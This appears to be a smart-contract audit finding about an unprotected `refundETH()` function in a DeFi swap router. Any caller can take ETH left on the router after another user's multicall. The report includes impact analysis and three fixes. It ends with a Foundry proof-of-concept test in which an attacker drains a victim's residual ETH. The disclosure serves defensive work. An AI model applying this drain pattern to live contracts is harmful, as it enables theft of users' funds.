**Key facts from the code:**

1. `refundETH()` has zero access control — it sends `address(this).balance` to `msg.sender`: [1](#0-0) 

2. `receive()` only blocks direct ETH pushes from non-WETH addresses — it does **not** block ETH arriving via `multicall{value: ...}` because `multicall` is `payable` and the ETH is part of the call value, not a separate `receive()` invocation: [2](#0-1) 

3. `pay()` deposits only the exact `value` requested by the swap into WETH, leaving any excess native ETH on the contract: [3](#0-2) 

4. `multicall` is a simple delegatecall loop with no post-call ETH balance check: [4](#0-3) 

5. The interface explicitly documents the pattern as optional ("unused ETH **can** be reclaimed via `refundETH` in the same multicall") — it is not enforced: [5](#0-4)

### Title
Unprivileged caller can steal residual native ETH left on the router by a prior user's `multicall{value}` via `refundETH()` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`refundETH()` unconditionally transfers the entire native ETH balance of the router to `msg.sender`. Because `multicall` is `payable` and `pay()` only wraps the exact swap amount into WETH, any excess ETH sent by a user who omits a `refundETH` step persists on the router across transaction boundaries. A subsequent caller can drain it in a standalone `refundETH()` call.

### Finding Description
`PeripheryPayments.refundETH()` contains no ownership or session check:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // sends to arbitrary caller
    }
}
```

The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) only blocks unsolicited ETH pushes. It does not prevent ETH from accumulating via `multicall{value: X}` when `X` exceeds the amount consumed by the swap. After the multicall transaction settles, the residual ETH is unattributed on the contract and claimable by anyone.

### Impact Explanation
Direct loss of user principal. Any ETH left on the router after a `multicall{value}` without a `refundETH` step is immediately claimable by an unprivileged attacker. The loss is bounded only by the excess ETH the victim sent. A MEV bot monitoring the mempool can front-run or back-run the victim's multicall to claim the residual in the same block.

### Likelihood Explanation
The pattern is explicitly documented as optional, not enforced. Users performing exact-input swaps with a round-number ETH value (e.g., `multicall{value: 1 ether}([exactInputSingle(amountIn: 999_000)])`) will routinely leave dust or significant residuals. Exact-output swaps are even more likely to leave residuals since the consumed amount is unknown at call-construction time. MEV infrastructure makes exploitation near-certain whenever residual ETH appears.

### Recommendation
Either:
1. **Enforce refund atomically**: At the end of `multicall`, if `address(this).balance > 0`, automatically refund to the original `msg.sender` (captured before the delegatecall loop).
2. **Restrict `refundETH` to a session caller**: Store `msg.sender` in transient storage at `multicall` entry and require `refundETH` callers to match it.
3. **Revert on excess ETH**: After each swap step, revert if `address(this).balance` exceeds what was deposited in the current call (requires tracking per-call ETH in transient storage).

Option 1 is the simplest and mirrors how some Uniswap v4 periphery contracts handle this.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "metric-periphery/contracts/MetricOmmSimpleRouter.sol";
import {IMetricOmmSimpleRouter} from "metric-periphery/contracts/interfaces/IMetricOmmSimpleRouter.sol";

contract RefundETHTheftTest is Test {
    MetricOmmSimpleRouter router;
    address userA  = makeAddr("userA");
    address attacker = makeAddr("attacker");
    // ... pool/weth setup omitted for brevity

    function test_attackerStealsResidualETH() public {
        vm.deal(userA, 2 ether);

        // UserA swaps 1 ETH worth but sends 2 ETH, forgets refundETH step
        vm.prank(userA);
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(
            router.exactInputSingle.selector,
            IMetricOmmSimpleRouter.ExactInputSingleParams({
                pool: address(pool),
                tokenIn: address(weth),
                tokenOut: address(token1),
                zeroForOne: true,
                amountIn: 1 ether,       // only 1 ETH consumed
                amountOutMinimum: 0,
                recipient: userA,
                deadline: block.timestamp + 1,
                priceLimitX64: 0,
                extensionData: ""
            })
        );
        router.multicall{value: 2 ether}(calls);  // 1 ETH residual left on router

        assertEq(address(router).balance, 1 ether, "residual on router");

        // Attacker steals it in a separate tx
        uint256 before = attacker.balance;
        vm.prank(attacker);
        router.refundETH();

        assertEq(attacker.balance - before, 1 ether, "attacker received userA's ETH");
        assertEq(address(router).balance, 0);
    }
}
```
